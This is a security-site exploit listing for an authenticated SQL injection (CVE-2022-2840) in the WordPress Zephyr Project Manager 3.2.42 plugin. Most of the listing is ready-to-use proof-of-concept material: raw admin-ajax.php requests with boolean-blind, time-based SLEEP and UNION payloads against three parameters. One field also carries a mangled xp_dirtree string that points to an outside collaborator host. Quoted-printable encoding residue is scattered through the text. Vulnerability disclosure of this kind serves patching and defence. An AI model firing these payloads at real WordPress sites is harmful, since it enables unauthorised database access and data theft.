---
title: WordPress Zephyr Project Manager 3.2.42 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022100038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-16
fetch_date: 2025-10-03T20:01:53.534322
---

# WordPress Zephyr Project Manager 3.2.42 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Zephyr Project Manager 3.2.42 SQL Injection** **2022.10.15**  Credit:  **[Rizacan Tufan](https://cxsecurity.com/author/Rizacan%2BTufan/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-2840](https://cxsecurity.com/cveshow/CVE-2022-2840/ "Click to see CVE-2022-2840")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Wordpress Plugin Zephyr Project Manager 3.2.42 - Multiple SQLi
# Date: 14-08-2022
# Exploit Author: Rizacan Tufan
# Blog Post: https://rizax.blog/blog/wordpress-plugin-zephyr-project-manager-multiple-sqli-authenticated
# Software Link: https://wordpress.org/plugins/zephyr-project-manager/
# Vendor Homepage: https://zephyr-one.com/
# Version: 3.2.42
# Tested on: Windows, Linux
# CVE : CVE-2022-2840 (https://wpscan.com/vulnerability/13d8be88-c3b7-4d6e-9792-c98b801ba53c)
# Description
Zephyr Project Manager is a plug-in that helps you manage and get things done effectively, all your projects and tasks.
It has been determined that the data coming from the input field in most places throughout the application are used in=20
the query without any sanitize and validation.
The details of the discovery are given below.
# Proof of Concept (PoC)=20
The details of the various SQL Injection on the application are given below.
## Endpoint of Get Project Data.
Sample Request :=20
POST /wp-admin/admin-ajax.php HTTP/2
Host: vuln.local
Cookie: ...
...
Referer: https://vuln.local/wp-admin/admin.php?page=3Dzephyr\_project\_manager\_projects
Content-Type: application/x-www-form-urlencoded; charset=3DUTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 74
Origin: https://vuln.local
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
action=3Dzpm\_view\_project&project\_id=3D1&zpm\_nonce=3D22858bf3a7
Payload :=20
---
Parameter: project\_id (POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: action=3Dzpm\_view\_project&project\_id=3D1 AND 4923=3D4923&zpm\_nonce=3D22858bf3a7
Type: time-based blind
Title: MySQL >=3D 5.0.12 OR time-based blind (query SLEEP)
Payload: action=3Dzpm\_view\_project&project\_id=3D1 OR (SELECT 7464 FROM (SELECT(SLEEP(20)))EtZW)&zpm\_nonce=3D22858bf3a7
Type: UNION query
Title: Generic UNION query (NULL) - 20 columns
Payload: action=3Dzpm\_view\_project&project\_id=3D-4909 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a7071,0x6264514e6e4944795a6f6e4a786a6e4d4f666255434d6a5553526e43616e52576c75774743434f67,0x71786b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&zpm\_nonce=3D22858bf3a7
---
## Endpoint of Get Task Data.
Sample Request :=20
POST /wp-admin/admin-ajax.php HTTP/2
Host: vuln.local
Cookie: ...
...
Referer: https://vuln.local/wp-admin/admin.php?page=3Dzephyr\_project\_manager\_tasks
Content-Type: application/x-www-form-urlencoded; charset=3DUTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: https://vuln.local
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
task\_id=3D1&action=3Dzpm\_view\_task&zpm\_nonce=3D22858bf3a7
Payload :=20
---
Parameter: task\_id (POST)
Type: time-based blind
Title: MySQL >=3D 5.0.12 AND time-based blind (query SLEEP)
Payload: task\_id=3D1 AND (SELECT 5365 FROM (SELECT(SLEEP(20)))AdIX)&action=3Dzpm\_view\_task&zpm\_nonce=3D22858bf3a7
---
## Endpoint of New Task.
Sample Request :=20
POST /wp-admin/admin-ajax.php HTTP/2
Host: vuln.local
Cookie: ...
...
Referer: https://vuln.local/wp-admin/admin.php?page=3Dzephyr\_project\_manager\_tasks
Content-Type: application/x-www-form-urlencoded; charset=3DUTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 337
Origin: https://vuln.local
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
task\_name=3Dtest&task\_description=3Dtest&task\_project=3D1&task\_due\_date=3D&task\_start\_date=3D&team=3D0&priority=3Dpriority\_none&status=3Dtest&type=3Ddefault&recurrence%5Btype%5D=3Ddefault&parent-id=3D-1&action=3Dzpm\_new\_task&zpm\_nonce=3D22858bf3a7
Payload :=20
---
Parameter: task\_project (POST)
Type: time-based blind
Title: MySQL >=3D 5.0.12 AND time-based blind (query SLEEP)
Payload: task\_name=3Dtest&task\_description=3Dtest&task\_project=3D1 AND (SELECT 3078 FROM (SELECT(SLEEP(20)))VQSp)&task\_due\_date=3D&task\_start\_date=3D&team=3D0&priority=3Dpriority\_none&status=3Drrrr-declare-q-varchar-99-set-q-727aho78zk9gcoyi8asqud6osfy9m0io9hx9kz8o-oasti-fy-com-tny-exec-master-dbo-xp-dirtree-q&type=3Ddefault&recurrence[type]=3Ddefault&parent-id=3D-1&action=3Dzpm\_new\_task&zpm\_nonce=3D22858bf3a7
---

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100038)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top